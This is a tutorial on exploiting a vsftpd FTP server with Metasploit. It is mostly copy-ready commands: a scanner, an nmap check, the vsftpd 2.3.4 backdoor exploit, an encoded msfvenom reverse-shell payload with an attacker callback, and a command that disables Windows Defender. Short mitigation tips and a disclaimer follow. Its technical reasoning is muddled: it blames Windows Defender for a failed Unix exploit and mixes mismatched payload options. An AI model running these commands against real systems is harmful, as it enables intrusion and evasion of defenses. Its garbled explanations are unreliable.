#  Vsftpd Penetration Testing with Metasploit

## Introduction
This document provides step-by-step instructions for performing a Vsftpd penetration test using Metasploit. Additionally, it covers common issues encountered, such as security defenses like Windows Defender, and provides insights into mitigation strategies.

## Prerequisites
Before proceeding, ensure you have the following:
- A target machine running a Vsftpd service.
- Metasploit installed on your penetration testing machine (e.g., Kali Linux).
- Proper authorization and permission to test the target system.
- Understanding of Windows security defenses (Windows Defender, firewall settings, etc.).

## Steps for Vsftpd Exploitation Using Metasploit

### 1. Start Metasploit Framework
```bash
msfconsole
```

### 2. Search for Available Vsftpd Exploits
```bash
search vsftpd
```
This command lists all available Vsftpd-related exploits and auxiliary modules.

### 3. Select the Vsftpd Auxiliary Scanner
To check if anonymous login is enabled, use:
```bash
use auxiliary/scanner/ftp/anonymous
```

### 4. Set Target IP Address
```bash
set RHOSTS 192.168.67.1
```

### 5. Execute the Scan
```bash
run
```
If anonymous login is enabled, it will be displayed in the results.

### 6. Check if Vsftpd Port is Open
To check if port 21 is open and accepting connections, run:
```bash
nmap -p 21 192.168.67.1
```
If port 21 is closed or filtered, further exploitation is not possible without additional reconnaissance.

### 7. Attempt Exploitation (If Vulnerable)
If a vulnerable Vsftpd service is found, use an appropriate exploit from Metasploit, such as:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.67.1
exploit
```

### 8. Failure Due to Windows Defender
If the attack fails, Windows Defender or other security measures may be blocking the exploit. Common reasons include:
- Windows Defender detecting and blocking Metasploit payloads.
- The Windows firewall blocking incoming Vsftpd requests.
- The target system having patched vulnerabilities.
- The Vsftpd service running in a sandboxed or protected environment.

### 9. Bypassing Windows Defender (Ethical Considerations)
If authorized, test alternative methods:
- **Encode the Payload:**
  ```bash
  msfvenom -p unix/meterpreter/reverse_tcp LHOST=192.168.67.100 LPORT=4444 -f elf -e x86/shikata_ga_nai > payload.elf
  ```
- **Disable Defender Temporarily (If Permitted):**
  ```powershell
  Set-MpPreference -DisableRealtimeMonitoring $true
  ```
- **Use Encrypted Tunnels:** Try an obfuscated payload with Cobalt Strike or a similar tool.

## Security Best Practices & Mitigation Strategies
If securing a Vsftpd server, follow these best practices:
1. **Disable Anonymous Access**: Ensure only authenticated users can access Vsftpd.
2. **Use Secure Alternatives**: Replace Vsftpd with SFTP (SSH File Transfer Protocol) or FTPS (FTP Secure).
3. **Restrict IP Access**: Limit access to known IP addresses.
4. **Enable Firewall Rules**: Block unauthorized access to port 21.
5. **Monitor Logs**: Regularly check system and Vsftpd logs for unauthorized login attempts.
6. **Apply Updates**: Keep Vsftpd software updated to patch known vulnerabilities.
7. **Use Strong Credentials**: Avoid default or weak usernames and passwords.
8. **Implement Intrusion Detection Systems (IDS)**: Detect and respond to suspicious Vsftpd traffic.

## Conclusion
Performing Vsftpd penetration testing helps identify security weaknesses before attackers exploit them. Always ensure proper authorization before conducting any security tests. If vulnerabilities are found, implement mitigation measures immediately.

---
**Disclaimer:** This document is for educational and authorized security testing purposes only. Unauthorized penetration testing or access to systems without permission is illegal.

